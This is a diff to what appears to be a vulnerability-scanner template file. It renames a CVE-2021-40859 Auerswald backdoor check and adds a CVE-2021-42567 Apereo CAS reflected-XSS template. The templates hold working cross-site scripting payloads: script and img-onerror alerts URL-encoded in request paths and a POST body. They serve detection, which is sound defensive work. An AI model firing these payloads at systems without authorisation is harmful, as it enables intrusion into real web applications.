@@ -13850,7 +13850,7 @@
     {
       "id": "CVE-2021-40859",
       "info": {
-        "name": "CVE-2021-40859",
+        "name": "Auerswald COMpact 5500R 7.8A and 8.0B devices Backdoor",
         "severity": "critical"
       },
       "requests": [
@@ -14233,6 +14233,20 @@
           "path": [
             "{{BaseURL}}/ie50/system/login/SysLoginUser.aspx?Login=Error&Error=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
             "{{BaseURL}}/system/login/SysLoginUser.aspx?Login=Error&Error=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-42567",
+      "info": {
+        "name": "Apereo CAS Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /cas/v1/tickets/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=%3Cimg%2Fsrc%2Fonerror%3Dalert%28document.domain%29%3E&password=test\n"
           ]
         }
       ]
